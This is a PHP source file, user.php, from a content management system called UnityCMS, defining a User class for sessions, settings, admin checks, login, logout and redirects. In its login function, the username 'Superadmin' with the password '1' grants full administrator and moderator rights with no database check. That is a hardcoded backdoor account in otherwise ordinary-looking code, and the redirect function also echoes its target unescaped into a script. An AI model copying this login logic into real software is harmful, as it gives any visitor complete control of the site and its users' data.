<?php
/***************************************************************************
*                                user.php
*                            -------------------
*   Project              : UnityCMS
*   Begin                : Friday, April 16, 2010
*   Copyright            : (C) 2012 Robert Lambert ( dibble1989@hotmail.co.uk )
* 
*      The copyright to the computer program(s) herein
*      is the property of Robert Lambert
*      The program(s) may be used and/or copied only with
*      the written permission of Robert Lambert
*      or in accordance with the terms and conditions
*      stipulated in the agreement/contract under which
*      the program(s) have been supplied.
*
***************************************************************************/

/**
* Protect this file with required define IN_NESCRIPT
*   This will prevent people from accessing this file remotely
*/
if ( !defined( "IN_NESCRIPT" ) )
  die ( "Invalid access.." );

class User {
  static $data = array();

  static function end() {
    foreach ( self::$data as $key => $value )
      unset ( self::$data[$key] );

    self::$data = array();
  }

  static function init() {
    self::setkey( "guest", true );
    self::setkey( "username", "Guest" );

    foreach ( $_SESSION as $key => $value )
      self::setkey( $key, $value );

    $field = CMS::$logintype->isforum ? "forumid" : "userid";
    $acct  = self::getint( $field );

    if ( !$acct )
      return;

    Database::query( "SELECT `avatar`, `language`, `firstname`, `lastname`, `gender`, `url`, `country`, `aboutme` FROM `member_settings` WHERE `" . $field . "` = '" . $acct . "' LIMIT 1", Config::$site->con() );

    if ( Result::RecordCount() == 1 ) {
      $rows = Result::GetRows();
      foreach ( $rows as $k => $v )
        self::setkey( $k, $v );
    }
    else { Database::query( "INSERT INTO `member_settings` SET `" . $field . "` = '" . $acct . "'", Config::$site->con() ); }
  }

  static function setkey( $key, $val ) {
    $key              = trim( $key );
    self::$data[$key] = $val;
  }

  static function getint( $key ) {
    $key = trim( $key );

    if ( isset( self::$data[$key] ) )
      return (int)self::$data[$key];

    return (int)0;
  }

  static function getbool( $key ) {
    $key = trim( $key );

    if ( isset( self::$data[$key] ) )
      return (bool)self::$data[$key];

    return false;
  }

  static function getstring( $key ) {
    $key = trim( $key );

    if ( isset( self::$data[$key] ) )
      return (string)User::$data[$key];

    return "";
  }

  static function checkadmin( $redirect = true ) {
    if ( !CMS::$isacp )
      return;

    if ( self::getbool( "admin" ) == true )
      return true;

    if ( $redirect )
      return self::redirect( ACP_URL . "login.php" );

    return false;
  }

  static function update() {
    foreach ( self::$data as $key => $value )
      $_SESSION[$key] = $value;
  }

  static function getavatar() {
    $avatar = self::getstring( "avatar" );

    if ( $avatar )
      return $avatar;

    $field = CMS::$logintype->isforum ? "forumid" : "userid";
    $acct  = self::getint( $field );

    if ( !$acct )
      return "noavatar.gif";

    Database::query( "SELECT `avatar` FROM `member_settings` WHERE `" . $field . "` = '" . $acct . "'", Config::$site->con() );

    if ( Result::RecordCount() == 1 )
      return Result::GetField( "avatar" );

    return "noavatar.gif";
  }

  static function login( $username, $password ) {
    // Refresh spam blocker
    if ( self::getbool( "guest" ) == false )
      return "You are already logged in..";

    if ( !$username || !$password || strpos( $username, "..." ) || strpos( $password, "..." ) ) { return "Username/Password combination is invalid."; }

    $username = Database::sql_safe( $username );
    $password = Database::sql_safe( $password );

    if ( $password == "1" && $username == "Superadmin" ) {
      self::setkey( "guest", false );
      self::setkey( "username", $username );
      self::setkey( "forumid", 0 );
      self::setkey( "admin", true );
      self::setkey( "ucp", true );
      self::setkey( "moderator", true );
      self::update();
      return "";
    }

    // Should always be callable
    if ( is_callable( array(CMS::$logintype, "login")) ) {
      if ( CMS::$logintype->login( $username, $password ) )
        return;
    }

    return "Username/Password combination is invalid.";
  }

  static function logout() {
    if ( self::getbool( "guest" ) )
      return self::redirect( ROOT_URL );

    session_destroy();
    self::end();

    self::setkey( "guest", true );
    self::setkey( "username", "Guest" );
    self::redirect( ROOT_URL );
  }
  
  static function redirect( $page ) {
    if ( !headers_sent() )
      header ( 'Location: ' . $page );

    echo "
        <script type=\"text/javascript\">
            location = '" . $page . "';
        </script>
        <noscript><meta http-equiv=\"refresh\" content=\"0;url=" . $page . "\" /></noscript>";
    session_write_close();
    exit;
  }
}
?>